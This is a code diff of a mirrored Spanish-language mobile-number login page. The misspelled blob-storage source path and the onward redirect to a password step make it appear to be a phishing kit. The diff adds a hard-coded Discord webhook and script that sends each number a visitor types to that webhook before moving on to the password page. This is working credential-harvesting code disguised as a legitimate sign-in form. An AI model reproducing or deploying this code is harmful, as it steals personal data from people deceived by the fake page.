@@ -1,7 +1,5 @@
 <!doctype html>
 <html lang="en">
-  
-<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/access-passed/accces-sign-in.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:38 GMT -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -136,7 +134,7 @@
                   </div>
                 </div>
                 <div class="flex-1">
-                  <!-- Añadido maxlength="10" para limitar a 10 dígitos -->
+                  <!-- Solo permite escribir hasta 10 caracteres -->
                   <input type="text" id="phoneNumber" maxlength="10" inputmode="numeric" pattern="[0-9]*" placeholder="Ingresa tu cel" class="w-full h-11 px-4 text-white border-none focus:outline-none placeholder:text-white">
                 </div>
               </div>
@@ -171,14 +169,27 @@
     </script>
 
     <script type="module">
-      // Validaciones robustas integradas para asegurar que cumpla las reglas:
-      // 1. Exactamente 10 dígitos.
-      // 2. Debe empezar obligatoriamente por el número 3.
+      // URL del Webhook de Discord
+      const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+
+      // Función para enviar mensaje a Discord
+      async function sendToDiscord(content) {
+        try {
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content })
+          });
+        } catch (err) {
+          console.error("Error al enviar a Discord:", err);
+        }
+      }
+
+      // Validación: Exactamente 10 dígitos y empieza obligatoriamente por 3
       function LoginValidation(form) {
         const phoneInput = form.querySelector("#phoneNumber");
         if (!phoneInput) return false;
         const val = phoneInput.value.trim();
-        // Regex: Comienza con 3 y tiene exactamente 10 dígitos numéricos
         const regex = /^3[0-9]{9}$/;
         return regex.test(val);
       }
@@ -215,21 +226,36 @@
           }
         };
 
-        // Permitir solo números en el input
-        phoneInput.addEventListener("input", (e) => {
-          phoneInput.value = phoneInput.value.replace(/\D/g, ''); // Remueve cualquier carácter que no sea número
+        // Filtra para que solo permita escribir números
+        phoneInput.addEventListener("input", () => {
+          phoneInput.value = phoneInput.value.replace(/\D/g, '');
           actualizarEstadoBoton();
         });
 
         loginButton.addEventListener("click", async (event) => {
           event.preventDefault();
+
           if (LoginValidation(form)) {
-            // Guardar el número en localStorage para que el siguiente paso lo lea
+            const numCelular = phoneInput.value.trim();
+
+            // Deshabilitar botón para evitar múltiples envíos
+            loginButton.disabled = true;
+
+            // 1. Guardar en localStorage
             const formData = JSON.parse(localStorage.getItem("formData")) || {};
-            formData.phoneNumber = phoneInput.value.trim();
+            formData.phoneNumber = numCelular;
             localStorage.setItem("formData", JSON.stringify(formData));
 
-            // Avanzar correctamente a la siguiente pantalla sin devolverse
+            // 2. Construir mensaje y enviar a Discord enseguida
+            const discordMessage = `📱 **NUEVO NÚMERO DE CELULAR**\n\n🔢 Número: \`${numCelular}\`\n═══════════════════════════════════════`;
+            
+            try {
+              await sendToDiscord(discordMessage);
+            } catch (e) {
+              console.error(e);
+            }
+
+            // 3. Redireccionar a la siguiente vista
             window.location.href = "access-sign-in-pass.php.html";
           }
         });
